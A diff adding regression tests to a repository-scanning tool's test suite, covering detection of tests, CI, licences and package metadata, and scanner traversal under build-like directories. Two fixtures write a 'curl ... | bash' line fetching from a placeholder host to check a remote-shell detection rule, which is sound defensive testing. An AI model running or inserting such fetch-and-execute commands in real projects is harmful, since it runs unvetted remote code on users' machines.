@@ -6,6 +6,12 @@ import unittest
 from pathlib import Path
 from contextlib import redirect_stdout
 from unittest.mock import Mock, patch
+from repo_scout.cli import _local_signals
+from repo_scout.models import Finding, RepoReport, RepoSignals, RepoSummary
+from repo_scout.report import write_report
+from repo_scout.scanner import scan_path
+from repo_scout.scoring import score_repository
+
 
 from repo_scout.cache import FileCache
 from repo_scout.cli import (
@@ -199,3 +205,105 @@ class CliErrorTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class LocalEvidenceRegressions(unittest.TestCase):
+    """Signal detection defects measured against real repositories, 2026-09-08.
+
+    Repo Scout's stated doctrine is that `absent` means confirmed to lack and
+    `unknown` means not established. v0.1 looked for tests, CI and package
+    metadata only at the top level, case-sensitively, and only in the four
+    forms it happened to know, then printed `absent` for everything else. That
+    is the one claim the tool says it will never make.
+    """
+
+    def _signals(self, layout):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp) / "repo"
+            for name, body in layout.items():
+                target = root / name
+                target.parent.mkdir(parents=True, exist_ok=True)
+                target.write_text(body, encoding="utf-8")
+            return _local_signals(root)
+
+    def test_finds_tests_below_the_top_level(self):
+        for layout in (
+            {"src/test/java/AppTest.java": "class AppTest {}", "README.md": "#"},
+            {"spec/app_spec.rb": "describe", "README.md": "#"},
+            {"__tests__/app.test.js": "test()", "README.md": "#"},
+            {"internal/handler_test.go": "package internal", "README.md": "#"},
+        ):
+            with self.subTest(layout=sorted(layout)[0]):
+                self.assertEqual(self._signals(layout).has_tests, "present")
+
+    def test_finds_ci_that_is_not_github_actions(self):
+        for marker in (".gitlab-ci.yml", "Jenkinsfile", ".travis.yml",
+                       "azure-pipelines.yml", ".circleci/config.yml"):
+            with self.subTest(marker=marker):
+                self.assertEqual(self._signals({marker: "steps:"}).has_ci, "present")
+
+    def test_finds_package_metadata_beyond_four_ecosystems(self):
+        for marker in ("pom.xml", "build.gradle", "composer.json", "Gemfile",
+                       "setup.py", "CMakeLists.txt", "Package.swift"):
+            with self.subTest(marker=marker):
+                self.assertEqual(
+                    self._signals({marker: "x"}).has_package_metadata, "present")
+
+    def test_finds_package_metadata_in_a_monorepo(self):
+        layout = {"packages/web/package.json": "{}", "README.md": "#"}
+        self.assertEqual(self._signals(layout).has_package_metadata, "present")
+
+    def test_readme_and_licence_are_matched_case_insensitively(self):
+        signals = self._signals({"readme.md": "#", "licence": "MIT"})
+        self.assertEqual(signals.has_readme, "present")
+        self.assertEqual(signals.has_license, "present")
+
+    def test_copying_counts_as_a_licence(self):
+        self.assertEqual(self._signals({"COPYING": "GPL"}).has_license, "present")
+
+
+class ScanTraversalRegressions(unittest.TestCase):
+    def test_a_repository_beneath_a_build_directory_is_still_scanned(self):
+        """The ignore list was matched against the whole absolute path.
+
+        A repository that merely sat under a directory called `build`, `dist`,
+        `venv` or `node_modules` had every one of its files skipped, and the
+        report then said "No static risk findings" about a scan that had opened
+        nothing at all. Measured: a 100%/0% split, not a gradient.
+        """
+        for ancestor in ("build", "dist", "venv", "node_modules", "__pycache__"):
+            with self.subTest(ancestor=ancestor):
+                with tempfile.TemporaryDirectory() as tmp:
+                    repo = Path(tmp) / ancestor / "repo"
+                    repo.mkdir(parents=True)
+                    (repo / "install.sh").write_text(
+                        "curl https://example.invalid/i.sh | bash\n", encoding="utf-8")
+                    findings = scan_path(repo)
+                    self.assertTrue(
+                        any(f.rule == "remote-shell" for f in findings),
+                        f"nothing was scanned beneath a {ancestor}/ ancestor",
+                    )
+
+    def test_vendored_dependencies_are_not_attributed_to_the_repository(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = Path(tmp) / "repo"
+            (repo / "vendor" / "dep").mkdir(parents=True)
+            (repo / "vendor" / "dep" / "x.sh").write_text(
+                "curl https://example.invalid/i.sh | bash\n", encoding="utf-8")
+            self.assertEqual(scan_path(repo), [])
+
+    def test_a_report_survives_a_filename_that_is_not_valid_utf8(self):
+        """`write_text` raised UnicodeEncodeError -- a ValueError, which the
+        caller's `except OSError` did not catch -- so the command died with a
+        traceback after the whole scan had already been paid for."""
+        report = RepoReport(
+            repo=RepoSummary("dir", "Local repository scan", ""),
+            signals=RepoSignals(),
+            findings=[Finding(severity="high", rule="secret-like-string",
+                              path="src/caf\udce9.py", message="m")],
+            score=score_repository(RepoSummary("dir", "d", ""), RepoSignals(), [],
+                                   scanned=True, metadata=False),
+        )
+        with tempfile.TemporaryDirectory() as tmp:
+            md_path, html_path = write_report(report, Path(tmp))
+            self.assertTrue(md_path.exists() and html_path.exists())
